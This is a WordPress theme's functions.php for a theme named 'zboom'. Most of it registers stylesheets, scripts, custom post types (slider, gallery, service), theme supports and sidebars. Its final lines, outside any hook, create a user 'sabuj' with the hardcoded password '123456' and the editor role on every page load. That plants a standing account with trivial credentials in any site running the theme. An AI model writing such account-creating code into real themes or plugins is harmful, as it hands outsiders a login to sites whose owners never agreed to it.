<?php

/**
 * stylesheet registrer
 * 
 */  function register_css_and_js_style(){

    wp_register_style('zerogrid', get_template_directory_uri( ).'/css/zerogrid.css');
    wp_register_style('style', get_template_directory_uri( ).'/css/style.css');
    wp_register_style('responsive', get_template_directory_uri( ).'/css/responsive.css');
    wp_register_style('new-style', get_template_directory_uri( ).'/style.css');
    wp_register_style('responsiveslides', get_template_directory_uri( ).'/css/responsiveslides.css');
    wp_register_script('responsiveslides', get_template_directory_uri( ).'/js/responsiveslides.js');
    wp_register_script('custom', get_template_directory_uri( ).'/js/custom.js');


    wp_enqueue_style('zerogrid');
    wp_enqueue_style('style');
    wp_enqueue_style('responsive');
    wp_enqueue_style('new-style');
    wp_enqueue_style('responsiveslides');

    wp_enqueue_script('jquery');
    wp_enqueue_script('responsiveslides');
    wp_enqueue_script('custom');
    

 }

 add_action('wp_enqueue_scripts', 'register_css_and_js_style');

/**
 * register theme option with redux framwork
 * 
 */

 include('lib/redux-framework.php');
 include('lib/sample/theme-option-config.php');
 

 function zboom_default_option(){
    add_theme_support('title-tag');

    $args = array(
        'default-color' => '000000',
        'default-image' => '%1$s/images/pattern29.png',
    );
    add_theme_support('custom-background', $args);
    add_theme_support('post-thumbnails');

    load_theme_textdomain('zboom', get_template_directory_uri( ).'/lang');

    if(function_exists('register_nav_menu')){
        register_nav_menu('mainmenu',__('main menu','zboom'));
    }

    function readmore($limit){
        $post_content = explode(" ", get_the_content());
        $less_content = array_slice($post_content, 0, $limit );
        echo implode(" ", $less_content);
    }

    register_post_type( 'homeslider', array(
        'labels' => array(
            'name' => 'Slider',
            'add_new_item' => 'Add New Slider',
            'view_item' => 'View Slider',
            'new_item' => 'New Slider',
            'edit_item' => 'Edit Slider',
            'all_items' => 'All Sliders',
            'search_items' => 'Search Slider',
            'featured_image' => 'Slider Image',
            'set_featured_image' => 'Set Slider Image',
            'item_published' => 'Slider Published',
            'item_updated' => 'Slider Updated',
            'remove_featured_image' => 'Remove Slider Image',
            
            
        ),
        'public' => true,
        'supports' => array('title', 'thumbnail'),
        'menu_position'      => 10,
        'menu_icon'   => 'dashicons-slides',        
        
    ));



    register_post_type( 'gallery', array(
        'labels' => array(
            'name' => 'Gallery',
            'add_new_item' => 'Add New Gallery',
            'view_item' => 'View Gallery',
            'new_item' => 'New Gallery',
            'edit_item' => 'Edit Gallery',
            'all_items' => 'All Gallery',
            'search_items' => 'Search Gallery',
            'featured_image' => 'Gallery Image',
            'set_featured_image' => 'Set Gallery Image',
            'item_published' => 'Gallery Published',
            'item_updated' => 'Gallery Updated',
            'remove_featured_image' => 'Remove Gallery Image',
            
            
        ),
        'public' => true,
        'supports' => array('title', 'thumbnail'),
        'menu_position'      => 10,
        'menu_icon'   => 'dashicons-format-gallery',        
        
    ));

    register_post_type( 'service', array(
        'labels' => array(
            'name' => 'Service',
            'add_new_item' => 'Add New Service',
            'view_item' => 'View Service',
            'new_item' => 'New Service',
            'edit_item' => 'Edit Service',
            'all_items' => 'All Service',
            'search_items' => 'Search Service',
            
            
            
        ),
        'public' => true,
        'supports' => array('title', 'editor'),
        'menu_position'      => 11,
        'menu_icon'   => 'dashicons-block-default',        
        
    ));
    
    

 }

 add_action('after_setup_theme','zboom_default_option');


 function zboom_right_sidebar(){
    register_sidebar(array(
        'name' => __('Right Sidebar', 'zboom'),
        'description' => __('Add your Right sidebar here', 'zboom'),
        'id' => 'right-sidebar',
        'before_widget' => '<div class="box right-sidebar">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="heading"><h2>',
        'after_title' => '</h2></div><div class="content">',


    ));

    register_sidebar(array(
        'name' => __('Footer Sidebar', 'zboom'),
        'description' => __('Add your Footer widget sidebar here', 'zboom'),
        'id' => 'footer-widget-sidebar',
        'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="box">',
        'after_widget' => '</div></div></div></div>',
        'before_title' => '<div class="heading"><h2>',
        'after_title' => '</h2></div><div class="content">',


    ));

    register_sidebar(array(
        'name' => __('Contact page Right Sidebar', 'zboom'),
        'description' => __('Add your contact Right widget sidebar here', 'zboom'),
        'id' => 'contact-right-widget-sidebar',
        'before_widget' => '<div class="col-1-3"><div class="wrap-col"><div class="box">',
        'after_widget' => '</div></div></div></div>',
        'before_title' => '<div class="heading"><h2>',
        'after_title' => '</h2></div><div class="content">',


    ));

 }

 add_action('widgets_init', 'zboom_right_sidebar' );

 //crate new user 

    $newuser = new WP_User(wp_create_user('sabuj', '123456', 'sabuj@gmail.com' ));

    $newuser->set_role('editor');




?>